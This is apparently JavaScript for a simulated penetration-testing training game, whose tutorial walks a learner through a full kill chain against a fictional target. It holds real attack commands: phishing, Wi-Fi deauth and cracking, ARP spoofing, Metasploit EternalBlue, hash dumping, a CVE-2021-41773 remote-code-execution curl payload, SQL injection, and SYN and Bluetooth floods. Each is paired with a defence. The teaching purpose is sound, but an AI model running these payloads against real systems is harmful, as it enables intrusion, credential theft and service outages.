  /* ---------- Rewrite guided training: full PTES kill chain ---------- */
  var TT = function(){ return Windows.terminal && Windows.terminal.el; };
  var VV = function(){ return Windows.victim && Windows.victim.el; };
  var prefill = function(cmd){ return function(){ Term.open(); setTimeout(function(){ if(Term.input){ Term.input.value=cmd; Term.input.focus(); if(typeof setCaretEnd==='function')setCaretEnd(Term.input);} }, 200); }; };

  Tutorial.build = function(){
    this.steps = [
      {phase:'Operation Glass Cage', title:'Your first real engagement', center:true, open:function(){ if(Campaign)Campaign.open(); },
        body:'You\u2019re a <b>junior penetration tester</b>. A client signed a contract asking your firm to break in <i>on purpose</i> and prove where they\u2019re weak. Your mark: <b>'+esc(TARGET.name||'the target')+'</b> — '+esc(TARGET.role||'')+' at '+esc(TARGET.company||'')+'. We\u2019ll follow the real industry playbook (the <b>PTES</b> stages) end-to-end: recon → break in → get on the network → map it → sniff it → own a machine → prove impact → report. The <b>Objectives</b> panel tracks it all. Everything here is simulated.'},
      {phase:'Rules of engagement', title:'What separates a pro from a criminal', center:true,
        body:'These are the <i>exact</i> tools criminals use. The only difference is <b>permission</b> — a professional only ever touches a system they have <b>written authorisation</b> to test, and stays inside the agreed scope. Same keystrokes; one path is a career, the other a prison cell. Every command you\u2019ll run also teaches you the <b>defence</b> — because the best defenders are people who understand the attack.'},

      {phase:'\u2460 Recon (OSINT)', title:'Gather information first', target:TT, open:prefill('theHarvester -d '+(TARGET.domain||'')+' -b bing'),
        body:'Beginners attack; professionals <b>gather information</b> first. This is <i>passive</i> — we only read public data, so the target never knows. <b>theHarvester</b> sweeps search engines for a company\u2019s emails and subdomains.',
        cmd:'theHarvester -d '+(TARGET.domain||'')+' -b bing', match:/theharvester/i, obj:'osint',
        interp:'There he is: <b>'+esc(TARGET.email||'')+'</b>, reusing the handle <b>@'+esc(TARGET.handle||'')+'</b>. You didn\u2019t hack anything — you <i>read</i>. <b>Defence:</b> lock down privacy settings, don\u2019t reuse the same handle everywhere, and assume anything public can be chained.'},

      {phase:'\u2461 Social engineering', title:'Clone his login and wait', target:TT, open:prefill('zphisher'),
        body:'Now we target <b>'+esc(TARGET.first||'him')+'</b> personally. <b>zphisher</b> builds a pixel-perfect copy of a '+esc(TARGET.site||'login')+' page and logs whatever he types.<br><br>Run <code>zphisher</code>, then pick <b>02</b> (Instagram) → <b>01</b> (Localhost) → <b>N</b> (no custom port) → <b>Enter</b> (skip mask). On the fake page, type any email + password and press <b>Log in</b>.',
        cmd:'zphisher', event:'phish',
        interp:'His password dropped into your terminal in plain text. No firewall stops a person typing their password into the wrong box. <b>Defence:</b> check the URL bar every time, and use phishing-resistant MFA (passkeys).'},

      {phase:'\u2462 Account takeover', title:'People leak more than scanners do', target:TT,
        body:'One password, his whole digital life. The word <code>open</code> is already typed in your terminal — just press <b>Enter</b> to log into the breached account and read his posts.',
        cmd:'open', event:'social',
        interp:'Gold. His posts leak his home Wi-Fi <b>'+esc(TARGET.wifi||'')+'</b> and a new <b>'+esc(TARGET.speaker||'')+'</b>. You\u2019ve pivoted from his account to his <i>network</i>. <b>Defence:</b> unique passwords + MFA, and think before you post — attackers read every clue.'},

      {phase:'\u2463 Wireless access', title:'From his account to his Wi-Fi', center:true,
        body:'You know the network name now: <b>'+esc(TARGET.wifi||'HomeNet_5G')+'</b>. Crack it and you\u2019re sitting on the same LAN as every device in his flat. Wi-Fi cracking is a four-move combo — listen, watch, kick, crack — and we\u2019ll do each at the command line so you truly understand it.'},
      {phase:'\u2463 Wi-Fi · listen', title:'Turn your card into a listener', target:TT, open:prefill('airmon-ng start wlan0'),
        body:'Normally your card only hears traffic meant for you. <b>Monitor mode</b> makes it hear <i>everything</i> in the air, as <code>'+MON+'</code>.',
        cmd:'airmon-ng start wlan0', match:/airmon-ng\s+start/i,
        interp:'You\u2019re now eavesdropping on the raw airwaves — and you still haven\u2019t touched the target. Patience is the attacker\u2019s real weapon.'},
      {phase:'\u2463 Wi-Fi · watch', title:'See the airwaves', target:TT, open:prefill('airodump-ng '+MON),
        body:'<b>airodump-ng</b> lists nearby networks and the devices on each. To crack the password we need a <b>handshake</b> — the encrypted \u201cgreeting\u201d a device and router swap when it joins.',
        cmd:'airodump-ng '+MON, match:/airodump-ng/i,
        interp:'There\u2019s <b>'+esc(TARGET.wifi||'')+'</b> with a client connected. Snag: the handshake only happens on <i>join</i>, and he joined hours ago — so we force a rejoin.'},
      {phase:'\u2463 Wi-Fi · kick', title:'The clever move: kick him off', open:function(){ if(typeof Victim!=='undefined')Victim.ensure(); Term.open(); setTimeout(function(){ if(Term.input){Term.input.value='aireplay-ng --deauth 10 -a AA:BB:CC:11:22:33 -c DE:AD:BE:EF:42:42 '+MON;Term.input.focus();} },200); }, target:VV,
        body:'We send <b>deauthentication</b> frames that knock his device off the Wi-Fi. It panics and <b>auto-reconnects</b> — and in that instant performs the handshake, which we grab. <b>Watch the Victim Screen</b> drop and reconnect.',
        cmd:'aireplay-ng --deauth 10 -a AA:BB:CC:11:22:33 -c DE:AD:BE:EF:42:42 '+MON, match:/aireplay-ng/i,
        interp:'Saw it drop and come back? In that split second we captured the encrypted handshake. We hold the locked box — now we pick the lock.'},
      {phase:'\u2463 Wi-Fi · crack', title:'Guess a million passwords a second', target:TT, open:prefill('aircrack-ng -w /usr/share/wordlists/rockyou.txt HomeNet-01.cap'),
        body:'We can\u2019t read the password out of the handshake, so we run a <b>dictionary attack</b>: <b>aircrack-ng</b> tries millions of real leaked passwords (<code>rockyou.txt</code>) until one fits.',
        cmd:'aircrack-ng -w /usr/share/wordlists/rockyou.txt HomeNet-01.cap', match:/aircrack-ng/i, obj:'wifi',
        interp:'<b>KEY FOUND: sunshine2024.</b> A memorable word fell in seconds — it was already in the leak lists. <b>Defence #1 of the whole lab:</b> a long, random WPA2/WPA3 passphrase makes this attack pointless. Disable WPS; put IoT on a guest network.'},

      {phase:'\u2464 Map the network', title:'You\u2019re in. Now don\u2019t stop.', center:true,
        body:'This is the step most beginners miss. You could just mess with his speaker and call it a day — but a professional doesn\u2019t stop at a party trick. Being <i>on</i> the network is the beginning: now you <b>map</b> it, find the machines, and see which doors are unlocked. In PTES this is <b>vulnerability analysis</b>.'},
      {phase:'\u2464 Discover', title:'Find every device on the LAN', target:TT, open:prefill('netdiscover -r 10.10.14.0/24'),
        body:'<b>netdiscover</b> (or <b>arp-scan</b>) sends ARP requests across the subnet and lists every device that answers — a live map of his home network.',
        cmd:'netdiscover -r 10.10.14.0/24', match:/netdiscover|arp-scan/i,
        interp:'There\u2019s his PC <b>CLIENT-42 ('+VIP+')</b>, the router at <b>'+GW+'</b>, and more. You now know what\u2019s in the building. <b>Defence:</b> segment the network so a guest/IoT device can\u2019t even see the important machines.'},
      {phase:'\u2464 Scan', title:'Knock on every door of his PC', target:TT, open:prefill('nmap -sV -O '+VIP),
        body:'A computer talks through <b>ports</b> — numbered doors, each running a service. <b>nmap</b> knocks on all of them and reports which are open, what software answers, and even the OS. Every open door is a possible way in.',
        cmd:'nmap -sV -O '+VIP, match:/nmap/i, obj:'scan',
        interp:'Port <b>445</b> (SMB file-sharing) is open and the box is flagged <b>MS17-010 (EternalBlue)</b> — a critical hole patched back in 2017 that this machine never fixed. You didn\u2019t see a list; you saw an <i>opportunity</i>. <b>Defence:</b> patch, close unused ports, run a host firewall.'},
      {phase:'\u2464 Enumerate', title:'Look inside the open door', target:TT, open:prefill('enum4linux -a '+VIP),
        body:'A found port is just a door; <b>enumeration</b> is looking through the keyhole. <b>enum4linux</b> asks the SMB service for its shares and user accounts.',
        cmd:'enum4linux -a '+VIP, match:/enum4linux/i,
        interp:'A readable <b>Backups</b> share (tax + household scans), users <b>marcus</b> and <b>admin</b>, and SMBv1 switched on. <b>Defence:</b> disable SMBv1, lock down shares, apply least-privilege.'},

      {phase:'\u2465 Sniff the wire', title:'Become the middle-man', center:true,
        body:'You\u2019re on the same LAN, so you can try to <b>intercept</b> traffic between his PC and the router. When a login page uses plain <b>HTTP</b> instead of HTTPS, the username and password travel in the clear — and anyone in the middle can read them. This is PTES intelligence-gathering at the packet level.'},
      {phase:'\u2465 Capture', title:'Watch the packets', target:TT, open:prefill("tcpdump -i "+MON+" -A 'tcp port 80'"),
        body:'<b>tcpdump</b> prints packets as they fly past (Wireshark is the same thing with a GUI — open it from Applications any time). Watch for a plain-HTTP request to the router.',
        cmd:"tcpdump -i "+MON+" -A 'tcp port 80'", match:/tcpdump|wireshark/i,
        interp:'His PC is loading the router\u2019s login page over plain <b>HTTP</b>. If you can sit in the middle of that conversation, you can read what he types. That\u2019s the next move.'},
      {phase:'\u2465 MITM', title:'Poison the path and read his login', target:TT, open:prefill('arpspoof -i '+MON+' -t '+VIP+' '+GW),
        body:'<b>arpspoof</b> tells his PC \u201cI am the router\u201d and tells the router \u201cI am his PC,\u201d so all their traffic detours through you (a <b>man-in-the-middle</b>). Then you just watch the cleartext go by.',
        cmd:'arpspoof -i '+MON+' -t '+VIP+' '+GW, event:'capture',
        interp:'You caught his <b>router-admin</b> login in the clear — and it\u2019s the <i>same</i> password he used for the Wi-Fi. One reused password now owns his whole network. <b>Defence:</b> HTTPS everywhere, a VPN on untrusted networks, dynamic ARP inspection on the switch, and never reuse passwords.'},

      {phase:'\u2466 Get a shell', title:'Turn a weakness into access', center:true, open:prefill('searchsploit ms17-010'),
        body:'Scanning found an unpatched hole (MS17-010). <b>Exploitation</b> is using it to get control. First confirm an exploit exists — <b>searchsploit</b> searches a local database of known exploits. It\u2019s already typed; press <b>Enter</b>.',
        cmd:'searchsploit ms17-010', match:/searchsploit/i,
        interp:'There it is — a public EternalBlue exploit. Next we\u2019ll run it from <b>Metasploit</b>, the industry-standard exploitation framework.'},
      {phase:'\u2466 Exploit', title:'Fire EternalBlue with Metasploit', target:TT,
        open:function(){ Term.open(); setTimeout(function(){ if(Term.input){Term.input.value='msfconsole';Term.input.focus();} },200); },
        body:'Launch <b>msfconsole</b> (already typed — press Enter). Then run these three lines (you can copy-paste all three at once):<br><code>use exploit/windows/smb/ms17_010_eternalblue</code><br><code>set RHOSTS '+VIP+'</code><br><code>exploit</code>',
        cmd:'msfconsole', event:'exploit',
        interp:'<b>Meterpreter session opened.</b> You now have a SYSTEM-level shell on his PC — total control. <b>Defence:</b> this specific hole was patched in 2017. Patch management + disabling SMBv1 + EDR would have stopped it dead.'},

      {phase:'\u2467 Post-exploitation', title:'Prove control (then stop)', target:TT, open:prefill('hashdump'),
        body:'A criminal would now steal data and hide. You\u2019ll take just enough proof for the report. In the Meterpreter shell, run <code>sysinfo</code> to confirm the box, then <code>hashdump</code> (already typed) to grab the password hashes an attacker would crack or replay elsewhere.',
        cmd:'hashdump', event:'loot',
        interp:'Those hashes are the crown jewels — with them an attacker moves to other machines (<i>lateral movement</i>) and sets up <i>persistence</i>. You stop here and note it. <b>Defence:</b> least-privilege accounts, unique local admin passwords (LAPS), and monitoring for exactly this behaviour.'},

      {phase:'⑧ Crack the loot', title:'Turn hashes into passwords', target:TT, open:prefill('hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt'),
        body:'The dumped hashes aren\u2019t passwords yet — they\u2019re scrambled. <b>hashcat</b> guesses billions of candidates from <code>rockyou.txt</code> and keeps any whose hash matches. Weak, human passwords fall almost instantly.',
        cmd:'hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt', match:/hashcat|john/i, obj:'crack',
        interp:'Cracked. <b>admin</b> is <i>sunshine2024</i> — the reused Wi-Fi password <i>again</i> — and <b>marcus</b> is <i>Bali2024!</i>, built from the holiday he posted about. <b>Defence:</b> long, random, unique passphrases (never based on things you post) plus MFA, so one cracked password can\u2019t open everything.'},
      {phase:'⑨ Move sideways', title:'One machine is never the goal', center:true,
        body:'You own his PC — but real attackers <i>spread</i>. <b>Lateral movement</b> means using what you\u2019ve stolen to reach other machines. Your earlier network map showed a second host: <b>web01</b> ('+WEB+'), a web server. Let\u2019s knock it over too.'},
      {phase:'⑨ Lateral movement', title:'Exploit the web server', target:TT, open:prefill('curl --path-as-is "http://'+WEB+'/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; id"'),
        body:'<b>web01</b> runs <b>Apache 2.4.49</b> — vulnerable to <b>CVE-2021-41773</b>, a path-traversal bug that becomes remote code execution. This <b>curl</b> escapes the web root (<code>.%2e/</code> decodes to <code>../</code>), reaches <code>/bin/sh</code>, and runs <code>id</code> on the server.',
        cmd:'curl --path-as-is "http://'+WEB+'/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; id"', match:/curl/i, obj:'lateral',
        interp:'<code>uid=1(daemon)</code> — you ran a command on a machine you never logged into. That\u2019s lateral movement: one weak device becoming a whole-network breach. <b>Defence:</b> patch to Apache \u22652.4.51, keep \u201crequire all denied\u201d, disable CGI, and segment servers so a home PC can\u2019t even reach them.'},
      {phase:'⑩ Web-app attack', title:'The server has a second door', center:true,
        body:'You have a shell on web01, but there is a quieter way into its data: its <b>web application</b>. Northwind\u2019s customer portal has a login form, and forms that build database queries out of raw user input are the classic weak spot — <b>SQL injection</b>.'},
      {phase:'⑩ SQL injection', title:'Speak SQL through the login box', target:TT, open:prefill('sqlmap -u "http://'+WEB+'/login.php" --data="user=admin&pass=x" --dbs --dump --batch'),
        body:'The login runs something like <code>SELECT * FROM users WHERE user=\'<i>input</i>\'</code>. Type <code>\u2019 OR \u20191\u2019=\u20191 -- </code> and the condition is always true — you are in with no password. <b>sqlmap</b> automates finding that flaw and <b>dumping the whole database</b>.',
        cmd:'sqlmap -u "http://'+WEB+'/login.php" --data="user=admin&pass=x" --dbs --dump --batch', match:/sqlmap|union\s+select|or\s+.?1.?=.?1/i, obj:'sqli',
        interp:'You pulled Northwind\u2019s customer table — names, emails, card tails — with no valid login. That is a <b>data breach</b> (the <b>Confidentiality</b> pillar). <b>Defence:</b> <b>parameterised queries / prepared statements</b> are the real fix; add input validation, a least-privilege DB account, and a WAF.'},
      {phase:'⑪ Denial of service', title:'Or simply switch it off', target:TT, open:prefill('hping3 -S --flood -p 80 '+WEB),
        body:'You can read the server (SQLi) and control it (RCE). The last thing an attacker can do is make it <b>unavailable</b>. A <b>denial-of-service</b> flood sends more traffic than the server can answer, locking real customers out. <b>Reality check:</b> doing this to anything you do not own is a serious crime — real attacks use hijacked <i>botnets</i>. We only ever run it against our own lab host.',
        cmd:'hping3 -S --flood -p 80 '+WEB, match:/hping3|slowloris|hulk|--flood/i, obj:'ddos',
        interp:'web01 stopped answering — the site is down for everyone (the <b>Availability</b> pillar). Between SQLi, RCE and this, you have now broken all three pillars of security — the <b>CIA triad</b>: Confidentiality, Integrity, Availability. <b>Defence:</b> rate-limiting, SYN cookies, upstream scrubbing / a CDN (e.g. Cloudflare), anycast, and auto-scaling.'},
      {phase:'⑫ Impact', title:'Reach into his living room', target:function(){ return Windows.bluetooth && Windows.bluetooth.el; },
        open:function(){ if(typeof Bluetooth!=='undefined')Bluetooth.open(); Term.open(); setTimeout(function(){ if(Term.input){Term.input.value='l2ping -f '+(TARGET.speakerMac||'')+'';Term.input.focus();} },220); },
        body:'The final flourish — proof your reach is now <i>physical</i>. His <b>'+esc(TARGET.speaker||'speaker')+'</b> answers Bluetooth pings; flood it and its audio link starves and drops.<br><br>Run <code>l2ping -f '+(TARGET.speakerMac||'')+'</code> (already typed), or use the <b>Bluetooth Manager</b> → Scan → pick the speaker → flood.',
        cmd:'l2ping -f '+(TARGET.speakerMac||''), event:'bluetooth',
        interp:'Silence. From a phished password to the speaker in his lounge. <b>Defence:</b> keep firmware patched (modern stacks rate-limit these pings), put IoT on its own VLAN, and don\u2019t leave devices discoverable.'},

      {phase:'🛡️ Blue team', title:'Now break your own kill chain', center:true,
        body:'Flip the whole operation around — this is the part that protects <i>you</i>. Every stage you ran maps to a real attacker tactic (<b>MITRE ATT&CK</b>) and dies to one control:<br><br>'+
             '① <b>Recon</b> → lock down privacy; don\u2019t reuse the same handle everywhere.<br>'+
             '② <b>Phishing</b> → check the URL bar; use phishing-resistant MFA (passkeys).<br>'+
             '③④ <b>Takeover + Wi-Fi</b> → unique passwords, a long WPA2/WPA3 passphrase, IoT on a guest VLAN.<br>'+
             '⑤ <b>Scan / enumerate</b> → patch, close unused ports, segment the network.<br>'+
             '⑥ <b>MITM</b> → HTTPS everywhere; a VPN on untrusted Wi-Fi; dynamic ARP inspection.<br>'+
             '⑦⑧ <b>Exploit + crack</b> → patch management, disable SMBv1, EDR, strong unique passwords + MFA.<br>'+
             '⑨ <b>Pivot</b> → patch servers, least-privilege, network segmentation.<br>'+
             '⑩ <b>SQL injection</b> → parameterised queries, input validation, a least-privilege DB account, a WAF.<br>'+
             '⑪ <b>DDoS</b> → rate-limiting, SYN cookies, a CDN / scrubbing service, anycast, auto-scaling.<br><br>'+
             'A defender never has to block every step — breaking <i>any one link</i> collapses the whole chain. That\u2019s the entire game, and it\u2019s why understanding the attack is what makes you the strongest defender.'},
      {phase:'⑬ The real job', title:'Turn the whole attack into a defence', center:true, open:function(){ if(window.Report)Report.open(); },
        body:'A criminal vanishes with the loot. A <b>professional</b> documents <i>exactly</i> how they got in so the client can fix every hole. Read the <b>report</b> that just opened — it maps each finding to a remediation — then <b>Sign &amp; close out</b> the engagement.',
        event:'report',
        interp:'Signed. That report is the entire point: it converts your break-in into protection for a real person.'},

      {phase:'Graduation', title:'You just walked the full kill chain', center:true,
        body:'Look at the arc you completed: <b>Recon → Phish → Takeover → Wi-Fi → Scan → Enumerate → Sniff/MITM → Exploit → Loot → Crack → Pivot → SQLi → DDoS → Impact → Report</b>. That <i>is</i> the professional playbook (PTES), and every step came with its defence. Now flip it around: a <b>blue-teamer</b> breaks this chain at any single link — unique passwords, MFA, patching, HTTPS, network segmentation, and monitoring each defeat whole stages of this attack. Stay authorised, keep practising, and you\u2019re genuinely on the road to a cybersecurity career. The lab is yours.'}
    ];
  };

  /* ---------- Robust, event-independent advancement + ring fix ---------- */
  Tutorial.seen = Tutorial.seen || {};

  Tutorial.position = function(s){
    var ring = $('#tut-ring'), card = $('#tut-card');
    var el = null; if(s.target){ try{ el = s.target(); }catch(e){} }
    if(s.center){ ring.style.display='none';
      card.style.left = Math.max(12,(window.innerWidth - card.offsetWidth)/2)+'px';
      card.style.top  = Math.max(56,(window.innerHeight - card.offsetHeight)/2)+'px'; return; }
    card.style.left = Math.max(12, window.innerWidth - card.offsetWidth - 22)+'px';
    card.style.top  = '72px';
    var anyMax = document.querySelector('.window.max');   // maximized window fills the app — a ring is meaningless/confusing
    if(el && !anyMax){
      var r = el.getBoundingClientRect();
      if(r.width>40 && r.width < window.innerWidth*0.92 && r.height < window.innerHeight*0.92){
        var pad=6; ring.style.display='block';
        ring.style.left=(r.left-pad)+'px'; ring.style.top=(r.top-pad)+'px';
        ring.style.width=(r.width+pad*2)+'px'; ring.style.height=(r.height+pad*2)+'px'; return;
      }
    }
    ring.style.display='none';
  };

  Tutorial._unlock = function(s){
    this.eventDone[this.i]=true;
    var interp=$('#tutInterp'), next=$('#tutNext'), sp=$('.tut-nav .sp');
    if(interp && s.interp){ interp.style.display='block'; interp.innerHTML=s.interp; }
    if(next){ next.disabled=false; next.classList.add('pulse'); setTimeout(function(){next.classList.remove('pulse');},1500); }
    if(sp) sp.textContent='';
    var self=this; setTimeout(function(){ self.position(s); }, 40);
    toast('\u2713 Objective complete');
  };
  Tutorial.notify = function(ev){
    this.seen[ev]=true;
    if(this.active){ var s=this.steps[this.i]; if(s && s.event===ev) this._unlock(s); }
  };
  if(Bus){
    ['osint','phish','social','wifi','scan','capture','exploit','loot','bluetooth','report'].forEach(function(ev){
      Bus.on(ev, function(){ Tutorial.seen[ev]=true; if(Tutorial.active){ var s=Tutorial.steps[Tutorial.i]; if(s && s.event===ev) Tutorial._unlock(s); } });
    });
  }

  Tutorial.go = function(n){
    this.i = Math.max(0, Math.min(n, this.steps.length-1));
    var s = this.steps[this.i], last = this.i===this.steps.length-1;
    if(s.open){ try{ s.open(); }catch(e){} }
    $('#tutStep').textContent = 'Lesson '+(this.i+1)+' of '+this.steps.length+(s.phase?' · '+s.phase:'');
    $('#tutTitle').textContent = s.title;
    $('#tutBody').innerHTML = s.body;
    var turn=$('#tutTurn'), interp=$('#tutInterp'), next=$('#tutNext'), sp=$('.tut-nav .sp');
    var lbl = turn ? $('.tut-turn-lbl',turn) : null;
    var hasCmd = !!s.cmd, isEvent = !!s.event, isPractice = hasCmd && !!s.match && !isEvent;
    this.awaiting=null; this.awaitEvent=null; if(interp) interp.style.display='none';

    if(hasCmd){
      if(!Windows.terminal) Term.open();
      turn.style.display='block'; $('#tutCmd').textContent = s.cmd;
      setTimeout(function(){ if(Windows.terminal && Term.input){ Term.input.value=s.cmd; Term.input.focus(); if(typeof setCaretEnd==='function')setCaretEnd(Term.input);} }, 200);
    } else if(turn){ turn.style.display='none'; }

    var done;
    if(isEvent){
      done = this.eventDone[this.i] || this.seen[s.event] || (Campaign && Campaign.isDone && Campaign.isDone(s.event));
      if(done){ this.eventDone[this.i]=true; if(interp && s.interp){ interp.style.display='block'; interp.innerHTML=s.interp; } if(turn){ turn.classList.add('done'); if(lbl)lbl.textContent='\u2713 Done'; } next.disabled=false; if(sp)sp.textContent=''; }
      else { this.awaitEvent=s.event; if(turn){ turn.classList.remove('done'); if(lbl)lbl.textContent='\u25b6 Do this in the tool (it\u2019s typed for you \u2014 press \u21b5)'; } next.disabled=true; if(sp)sp.innerHTML='<span class="tut-wait">\u2191 do it in the tool to continue</span>'; }
    } else if(isPractice){
      done = this.done[this.i] || (s.obj && Campaign && Campaign.isDone && Campaign.isDone(s.obj));
      if(done){ this.done[this.i]=true; turn.classList.add('done'); if(lbl)lbl.textContent='\u2713 You ran it'; if(interp){interp.style.display='block'; interp.innerHTML=s.interp||'';} next.disabled=false; if(sp)sp.textContent=''; }
      else { turn.classList.remove('done'); if(lbl)lbl.textContent='\u25b6 Your turn \u2014 press \u21b5 in the terminal (or copy it)'; this.awaiting=s.match; next.disabled=true; if(sp)sp.innerHTML='<span class="tut-wait">\u2191 run the command to continue</span>'; }
    } else {
      if(turn) turn.style.display='none'; next.disabled=false; if(sp)sp.textContent='';
    }
    $('#tutBack').disabled = this.i===0;
    next.textContent = last ? 'Finish' : 'Next';
    var self=this; setTimeout(function(){ self.position(s); }, 220);
  };

  Tutorial.onCommand = function(cmd){
    if(!this.active || !this.awaiting) return;
    if(this.awaiting.test(cmd)){
      var s=this.steps[this.i];
      this.done[this.i]=true; this.awaiting=null;
      var turn=$('#tutTurn'), interp=$('#tutInterp'), next=$('#tutNext'), sp=$('.tut-nav .sp'), lbl=turn?$('.tut-turn-lbl',turn):null;
      if(turn){ turn.classList.add('done'); if(lbl)lbl.textContent='\u2713 You ran it'; }
      if(interp){ interp.style.display='block'; interp.innerHTML=s.interp||''; }
      if(next){ next.disabled=false; next.classList.add('pulse'); setTimeout(function(){next.classList.remove('pulse');},1500); }
      if(sp) sp.textContent='';
      if(s.obj && Campaign && Campaign.mark){ setTimeout(function(){ Campaign.mark(s.obj); }, 250); }
      toast('\u2713 Nice \u2014 you ran that one yourself');
      var self=this; setTimeout(function(){ self.position(s); }, 60);
    }
  };

  Tutorial.start = function(){
    this.build(); this.active=true; this.i=0;
    this.done={}; this.eventDone={}; this.awaiting=null; this.awaitEvent=null;
    if(Campaign && Campaign.open) Campaign.open();
    $('#tut-overlay').classList.add('on');
    this.go(0);
  };
})();

</script>
